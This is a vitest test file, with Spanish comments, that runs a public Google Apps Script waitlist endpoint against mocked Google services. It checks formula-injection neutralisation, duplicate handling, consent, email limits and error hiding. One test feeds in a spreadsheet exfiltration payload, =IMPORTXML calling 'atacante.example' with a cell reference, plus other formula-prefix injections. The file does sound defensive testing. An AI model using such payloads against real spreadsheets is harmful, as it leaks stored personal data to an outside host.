import { readFileSync } from "node:fs";
import { join } from "node:path";
import { createContext, runInContext } from "node:vm";
import { describe, expect, it } from "vitest";

/**
 * `docs/waitlist-apps-script.js` vive en la cuenta de Google del titular y es
 * público («Cualquier usuario»): cualquiera le puede mandar lo que quiera, no
 * solo el formulario. Se ejecuta aquí con los servicios de Google simulados.
 */
const FUENTE = readFileSync(join(import.meta.dirname, "..", "docs", "waitlist-apps-script.js"), "utf8");

function montar(opciones: { hojaRota?: boolean } = {}) {
  const filas: unknown[][] = [];
  const cache = new Map<string, string>();
  const hoja = {
    getLastRow: () => filas.length,
    appendRow: (f: unknown[]) => filas.push(f),
    setFrozenRows() {},
    getRange: (fila: number, col: number, n: number) => ({
      getValues: () => filas.slice(fila - 1, fila - 1 + n).map((f) => [f[col - 1]]),
    }),
  };
  const ctx = createContext({
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => "" }) },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock() {} }) },
    CacheService: {
      getScriptCache: () => ({ get: (k: string) => cache.get(k) ?? null, put: (k: string, v: string) => cache.set(k, v) }),
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => {
        if (opciones.hojaRota) throw new Error("Exception: no se encuentra 1AbCdEf_id_interno_de_la_hoja");
        return { getSheetByName: () => hoja, insertSheet: () => hoja };
      },
    },
    Utilities: { base64EncodeWebSafe: (s: string) => Buffer.from(s).toString("base64url") },
    ContentService: {
      MimeType: { JSON: "json", JAVASCRIPT: "js" },
      createTextOutput: (cuerpo: string) => ({ setMimeType: () => ({ cuerpo }) }),
    },
    UrlFetchApp: { fetch: () => ({ getContentText: () => "{}" }) },
  });
  runInContext(FUENTE, ctx);
  const enviar = (datos: Record<string, unknown>) => {
    const r = (ctx.doPost as (e: unknown) => { cuerpo: string })({ postData: { contents: JSON.stringify(datos) }, parameter: {} });
    return JSON.parse(r.cuerpo) as { ok: boolean; error?: string };
  };
  return { filas, cache, enviar };
}

const SOLICITUD = {
  email: "ana@ejemplo.com",
  profile: "manual",
  experience: "1-3",
  markets: "Forex",
  workflow: "excel",
  goal: "disciplina",
  privacyConsent: true,
  lang: "es",
};

describe("el Apps Script de la lista de espera", () => {
  it("guarda una solicitud normal tal cual", () => {
    const { filas, enviar } = montar();
    expect(enviar(SOLICITUD)).toEqual({ ok: true, duplicate: false });
    expect(filas.at(-1)!.slice(1, 5)).toEqual(["ana@ejemplo.com", "manual", "1-3", "Forex"]);
  });

  it("no deja que un texto se convierta en fórmula de la hoja", () => {
    const { filas, enviar } = montar();
    const formulas = ['=IMPORTXML("https://atacante.example/?"&B2,"//a")', "+1+1", "-2+3", "@SUMA(1)", "\t=1"];
    for (const [i, f] of formulas.entries()) {
      expect(enviar({ ...SOLICITUD, email: `p${i}@ejemplo.com`, markets: f, notes: f, source: f, utmSource: f }).ok).toBe(true);
    }
    expect(enviar({ ...SOLICITUD, email: "=HYPERLINK(1)@ejemplo.com" }).ok).toBe(true);
    const celdas = filas.slice(1).flatMap((f) => f.slice(1)).filter((c): c is string => typeof c === "string");
    expect(celdas.filter((c) => /^[=+\-@\t\r]/.test(c))).toEqual([]);
  });

  it("reconoce un duplicado aunque su correo se haya guardado neutralizado", () => {
    const { cache, enviar } = montar();
    enviar({ ...SOLICITUD, email: "-ana@ejemplo.com" });
    cache.clear(); // fuera del minuto de espera entre envíos del mismo correo
    expect(enviar({ ...SOLICITUD, email: "-ana@ejemplo.com", notes: "otra vez" })).toEqual({ ok: true, duplicate: true });
  });

  it("sin el consentimiento de privacidad no guarda nada", () => {
    const { filas, enviar } = montar();
    expect(enviar({ ...SOLICITUD, privacyConsent: false })).toEqual({ ok: false, error: "consentimiento" });
    expect(enviar({ ...SOLICITUD, privacyConsent: "true" }).ok).toBe(false);
    expect(filas).toEqual([]);
  });

  it("rechaza un correo de más de 254 caracteres", () => {
    const { filas, enviar } = montar();
    expect(enviar({ ...SOLICITUD, email: `${"a".repeat(250)}@ejemplo.com` })).toEqual({ ok: false, error: "email_invalido" });
    expect(filas).toEqual([]);
  });

  it("un fallo interno no cuenta detalles de la hoja a quien envía", () => {
    const { enviar } = montar({ hojaRota: true });
    const r = enviar(SOLICITUD);
    expect(r).toEqual({ ok: false, error: "error_interno" });
    expect(JSON.stringify(r)).not.toMatch(/id_interno|Exception/);
  });
});
